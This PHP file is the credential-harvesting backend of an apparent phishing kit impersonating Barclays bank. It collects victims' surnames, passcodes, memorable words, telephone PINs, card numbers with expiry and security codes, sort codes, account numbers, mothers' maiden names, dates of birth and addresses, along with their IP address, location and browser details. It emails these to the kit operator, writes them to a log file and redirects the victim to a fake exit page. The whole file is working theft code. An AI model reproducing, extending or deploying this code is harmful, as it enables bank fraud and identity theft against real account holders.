<?php
ini_set('display_errors', false);
date_default_timezone_set('Europe/London');
require_once('../../inc/functions.php');
require_once('../../inc/include_page.php');
require_once('../../inc/configuration.php');


error_reporting(0);
session_start();


date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$surname = $_SESSION['surname'];
$passcode = $_SESSION['passcode'];
$membership = "Membership No:"."".$_SESSION['membershipNumber'];
$ccno = "Card No:"."".$_SESSION['ccno'];
$sortcode = "Sortcode:"."".$_SESSION['sortcode'];
if(!empty($_SESSION['accountNumber'])) {
 $_SESSION['accountNumber'] = '-';
}
else {
	$_SESSION['accountNumber'] = $_SESSION['accountNumber'];
}
$acno = "Account No:"."".$_SESSION['accountNumber'];
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$address = $_SESSION['address'];
$ccno2 = $_POST['ccno']; 
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$memo = $_POST['memo'];
$telepin = $_POST['telepin'];
$mmn = $_POST['mmn'];
$account = $_POST['account'];
$sortcode2 = $_POST['sortcode'];

$ccno2 = str_replace(' ', '', $ccno2);
$cardInfo = bankDetails($ccno2);
$_SESSION['bin'] = ($cardInfo['bin']);
$_SESSION['brand'] = ($cardInfo['brand']);
$_SESSION['bank'] = ($cardInfo['issuer']);
$_SESSION['type'] = ($cardInfo['type']);
$bin = $_SESSION['bin'];
$bank = $_SESSION['bank'];
$brand = $_SESSION['brand'];
$type = $_SESSION['type'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$_SESSION['VictimInfo1'] = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$_SESSION['VictimInfo2'] = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$_SESSION['VictimInfo3'] = "| UserAgent : " . $systemInfo['useragent'] . "";
$_SESSION['VictimInfo4'] = "| Browser : " . $systemInfo['browser'] . "";
$_SESSION['VictimInfo5'] = "| Os : " . $systemInfo['os'] . "";
$VictimInfo1 = $_SESSION['VictimInfo1'];
$VictimInfo2 = $_SESSION['VictimInfo2'];
$VictimInfo3 = $_SESSION['VictimInfo3'];
$VictimInfo4 = $_SESSION['VictimInfo4'];
$VictimInfo5 = $_SESSION['VictimInfo5'];
$data = $_SESSION['details'];
$data .= "
+ ------------- C3AS3R --------------+
+ Account Information
| Surname : $surname
| Login Option : $membership $ccno $acno $sortcode
| Memorable Word : $memo
| Online Passcode: $passcode
| Telephone Passcode: $telepin
| Sortcode: $sortcode2
| Account No: $account
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| MMN : $mmn
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";

if ($emailSave == 1) {
	mail($email,  "barclays from " . $_SERVER['REMOTE_ADDR'], $data);
}


if ($fileSave === 1) {
    $file = fopen('../../logs/barclays.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}


redirectTo("../../exit.php?sslchannel=true&sessionid=" . randomString(30));
die;
?>